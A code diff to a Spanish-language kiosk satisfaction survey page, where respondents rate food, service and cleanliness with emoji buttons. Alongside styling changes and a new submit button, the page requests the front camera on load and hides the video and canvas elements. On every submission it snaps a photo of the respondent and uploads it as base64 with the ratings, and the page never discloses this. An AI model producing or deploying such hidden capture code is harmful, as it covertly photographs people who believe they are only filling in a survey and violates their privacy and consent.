@@ -10,49 +10,78 @@
   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet" />
 
   <style>
-    /* existing styles … (unchanged, trimmed for brevity) */
+    /* ── layout & basic styles ───────────────────────────── */
     html,body{height:100%;width:100%;margin:0;}
     body{display:flex;flex-direction:column;background:#f8f9fa;}
-    .survey-wrapper{flex:1 1 0;width:96vw;max-width:1400px;margin:auto;
-      padding:2rem 1rem;display:flex;flex-direction:column;justify-content:center;}
-    .survey-row{padding:2rem 2.2rem;font-size:1.35rem;display:flex;
-      align-items:center;justify-content:space-between;background:#fff;border-radius:1.5rem;
-      box-shadow:0 .5rem 1.25rem -.3rem rgb(0 0 0 / .15);margin-bottom:2rem;}
+
+    .survey-wrapper{
+      flex:1 1 0;
+      width:96vw;max-width:1400px;
+      margin:auto;padding:2rem 1rem;
+      display:flex;flex-direction:column;justify-content:center;
+    }
+
+    /* ── survey rows ─────────────────────────────────────── */
+    .survey-row{
+      padding:2rem 2.2rem;font-size:1.35rem;
+      display:flex;align-items:center;justify-content:space-between;
+      background:#fff;border-radius:1.5rem;
+      box-shadow:0 .5rem 1.25rem -.3rem rgb(0 0 0 / .15);
+      margin-bottom:2rem;
+    }
     .category-icon{font-size:2.25rem;opacity:.85;}
-    .emoji-btn{font-size:clamp(3.75rem,7vw,5.5rem);cursor:pointer;padding:.4rem;border-radius:50%;
-      transition:transform .2s,box-shadow .2s,background-color .2s;}
+
+    /* emoji buttons */
+    .emoji-btn{
+      font-size:clamp(3.75rem,7vw,5.5rem);
+      cursor:pointer;padding:.4rem;border-radius:50%;
+      transition:transform .2s,box-shadow .2s,background-color .2s;
+    }
     .emoji-btn[data-val="1"]{color:#dc3545;}
     .emoji-btn[data-val="2"]{color:#ffc107;}
     .emoji-btn[data-val="3"]{color:#198754;}
     .emoji-btn:hover{transform:translateY(-6px) scale(1.1);}
-    .emoji-btn.active{transform:scale(1.22);background:rgba(0,0,0,.05);
-      box-shadow:0 0 0 .35rem currentColor inset,0 .65rem 1rem -.35rem rgb(0 0 0 / .25);}
-    .toast{font-size:1.15rem;}
-    #fsBtn{position:fixed;bottom:2.5rem;left:50%;translate:-50% 0;z-index:1200;display:none;
-      padding:.75rem 1.5rem;border:none;border-radius:999px;background:#0d6efd;color:#fff;
-      font-size:1rem;font-weight:600;box-shadow:0 .4rem 1rem -.25rem rgb(0 0 0 / .3);
-      transition:opacity .2s;}
+    .emoji-btn.active{
+      transform:scale(1.22);background:rgba(0,0,0,.05);
+      box-shadow:0 0 0 .35rem currentColor inset,0 .65rem 1rem -.35rem rgb(0 0 0 / .25);
+    }
+
+    /* full-screen helper button */
+    #fsBtn{
+      position:fixed;bottom:2.5rem;left:50%;translate:-50% 0;z-index:1200;display:none;
+      padding:.75rem 1.5rem;border:none;border-radius:999px;
+      background:#0d6efd;color:#fff;font-size:1rem;font-weight:600;
+      box-shadow:0 .4rem 1rem -.25rem rgb(0 0 0 / .3);transition:opacity .2s;
+    }
     #fsBtn.hide{opacity:0;pointer-events:none;}
-    /* hide camera elements */
-    video,canvas{display:none;}
+
+    /* bottom bar with Enviar */
+    #sendBar{
+      z-index:1250;
+      box-shadow:0 -0.5rem 1rem -0.3rem rgb(0 0 0 / .1);
+    }
+
+    /* spinner overlay (hidden at start via d-none) */
+    video,canvas{display:none;}        /* hide camera elements in DOM */
   </style>
 </head>
 
 <body>
+  <!-- full-screen prompt button -->
   <button id="fsBtn">Pantalla completa&nbsp;↗︎</button>
 
   <div class="survey-wrapper fade-page">
     <h1 class="text-center mb-4 fw-bold display-5">Valora tu experiencia</h1>
 
-    <!-- Survey grid -->
+    <!-- survey form -->
     <form id="survey" class="w-100">
+      <!-- template for each row -->
       <template id="rowTpl">
         <div class="survey-row">
           <span class="d-flex align-items-center flex-grow-1 fw-semibold text-capitalize">
             <i class="bi category-icon me-3"></i>
             <span class="label-text"></span>
           </span>
-
           <div class="d-flex gap-5">
             <i class="bi bi-emoji-frown   emoji-btn" data-val="1"></i>
             <i class="bi bi-emoji-neutral emoji-btn" data-val="2"></i>
@@ -64,7 +93,19 @@
     </form>
   </div>
 
-  <!-- Toast -->
+  <!-- fixed bottom bar -->
+  <div id="sendBar" class="position-fixed bottom-0 start-0 w-100 bg-white border-top py-3 text-center">
+    <button id="sendBtn" class="btn btn-primary px-4" type="button" disabled>Enviar</button>
+  </div>
+
+  <!-- spinner overlay (flex centering, hidden by d-none) -->
+  <div id="spinnerOverlay"
+       class="d-flex d-none justify-content-center align-items-center position-fixed top-0 start-0 w-100 h-100 bg-white bg-opacity-75"
+       style="z-index:1300;">
+    <div class="spinner-border text-primary" role="status" style="width:3rem;height:3rem;"></div>
+  </div>
+
+  <!-- toast for success -->
   <div class="position-fixed bottom-0 end-0 p-4" style="z-index:1100">
     <div id="toastFeed" class="toast align-items-center text-bg-success border-0" role="alert">
       <div class="d-flex">
@@ -74,83 +115,95 @@
     </div>
   </div>
 
-  <!-- Hidden camera elements -->
+  <!-- hidden camera elements -->
   <video id="cam" autoplay playsinline></video>
   <canvas id="snap"></canvas>
 
+  <!-- Bootstrap JS bundle -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 
   <script>
-    /* ---------- Full-screen helper ---------- */
-    function goFullscreen(){ const el=document.documentElement;
-      if(el.requestFullscreen) el.requestFullscreen();
+    /* ─────────────────────────── full-screen helper */
+    function goFullscreen(){
+      const el=document.documentElement;
+      if(el.requestFullscreen)           el.requestFullscreen();
       else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
       else if(el.mozRequestFullScreen)    el.mozRequestFullScreen();
-      else if(el.msRequestFullscreen)     el.msRequestFullscreen(); }
+      else if(el.msRequestFullscreen)     el.msRequestFullscreen();
+    }
 
-    /* ---------- Prompt on load ---------- */
-    window.addEventListener("DOMContentLoaded",async()=>{
-      // full-screen prompt
+    /* ─────────────────────────── initial setup */
+    window.addEventListener("DOMContentLoaded", async ()=>{
+      /* full-screen prompt */
       const fsBtn=document.getElementById("fsBtn");
       fsBtn.style.display="block";
-      fsBtn.onclick = ()=>{ goFullscreen(); fsBtn.classList.add("hide"); };
+      fsBtn.onclick=()=>{ goFullscreen(); fsBtn.classList.add("hide"); };
       document.addEventListener("fullscreenchange",()=>{ if(!document.fullscreenElement) fsBtn.classList.remove("hide"); });
 
-      // ask for camera (front-facing if available)
+      /* try front-facing camera (ignored if denied) */
       try{
-        const stream = await navigator.mediaDevices.getUserMedia({video:{ facingMode:"user" }, audio:false});
-        document.getElementById("cam").srcObject = stream;
-      }catch(err){
-        console.warn("No se pudo acceder a la cámara:", err);
-      }
+        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});
+        document.getElementById("cam").srcObject=stream;
+      }catch(e){ console.warn("No se pudo acceder a la cámara:",e); }
     });
 
-    /* ---------- Survey logic ---------- */
-    (() => {
-      const areas=["comida","servicio","limpieza"];
-      const icons={servicio:"bi-bell",limpieza:"bi-bucket"};
-      const survey=document.getElementById("survey");
-      const tpl=document.getElementById("rowTpl").content;
+    /* ─────────────────────────── survey logic */
+    (()=>{
+      const areas = ["comida","servicio","limpieza"];
+      const icons = {servicio:"bi-bell",limpieza:"bi-bucket"};
 
+      /* refs */
+      const survey   = document.getElementById("survey");
+      const tpl      = document.getElementById("rowTpl").content;
+      const sendBtn  = document.getElementById("sendBtn");
+      const overlay  = document.getElementById("spinnerOverlay");
+      const toast    = new bootstrap.Toast(document.getElementById("toastFeed"));
+      const video    = document.getElementById("cam");
+      const canvas   = document.getElementById("snap");
+
+      /* build rows */
       areas.forEach(a=>{
         const row=tpl.cloneNode(true);
         row.querySelector(".label-text").textContent=a;
         const ic=row.querySelector(".category-icon");
-        if(a==="comida"){ic.classList.remove("bi");ic.textContent="🍩";}
-        else{ic.classList.add(icons[a]);}
+        if(a==="comida"){ ic.classList.remove("bi"); ic.textContent="🍩"; }
+        else            { ic.classList.add(icons[a]); }
         row.querySelector("input").name=a;
         row.querySelectorAll(".emoji-btn").forEach(b=>b.onclick=()=>select(b));
         survey.appendChild(row);
       });
 
-      const val=a=>survey.elements[a].value;
-      const done=()=>areas.every(a=>val(a));
+      /* helpers */
+      const val  = name=>survey.elements[name].value;
+      const done = ()=>areas.every(a=>val(a));
 
       function select(btn){
-        const before=done();
         const row=btn.closest(".survey-row");
         row.querySelectorAll(".emoji-btn").forEach(b=>b.classList.remove("active"));
         btn.classList.add("active");
         row.querySelector("input").value=btn.dataset.val;
-        if(!before && done()) submit();
+        sendBtn.disabled=!done();
       }
 
-      const toast=new bootstrap.Toast(document.getElementById("toastFeed"));
-      const video=document.getElementById("cam");
-      const canvas=document.getElementById("snap");
+      sendBtn.onclick=()=>{ if(done()){ showSpinner(); submit(); }};
 
+      function showSpinner(){ sendBtn.disabled=true; overlay.classList.remove("d-none"); }
+      function hideSpinner(){ overlay.classList.add("d-none"); }
+
+      /* take camera snapshot (optional) */
       async function takeSnapshot(){
-        if(!video.srcObject) return null;              // no camera
-        const {videoWidth: w, videoHeight: h} = video;
-        if(!w || !h) return null;
+        if(!video.srcObject) return null;
+        const {videoWidth:w, videoHeight:h}=video;
+        if(!w||!h) return null;
         canvas.width=w; canvas.height=h;
         canvas.getContext("2d").drawImage(video,0,0,w,h);
-        return canvas.toDataURL("image/png");          // base64
+        return canvas.toDataURL("image/png");
       }
 
+      /* submit to backend then reload after 2 s */
       async function submit(){
         const payload=Object.fromEntries(areas.map(a=>[a,val(a)]));
-        payload.photo_base64 = await takeSnapshot();
+        payload.photo_base64=await takeSnapshot();
 
         try{
           await fetch("/survey/submit",{
@@ -159,13 +212,14 @@
             body:JSON.stringify(payload)
           });
           toast.show();
-        }catch{ alert("Error al enviar."); }
-        finally{ reset(); }
-      }
-
-      function reset(){
-        survey.querySelectorAll(".emoji-btn").forEach(b=>b.classList.remove("active"));
-        survey.reset();
+        }catch(e){
+          alert("Error al enviar.");
+          hideSpinner();
+          sendBtn.disabled=false;
+          return;
+        }
+        /* keep spinner visible 2 s, then reload */
+        setTimeout(()=>location.reload(),2000);
       }
     })();
   </script>
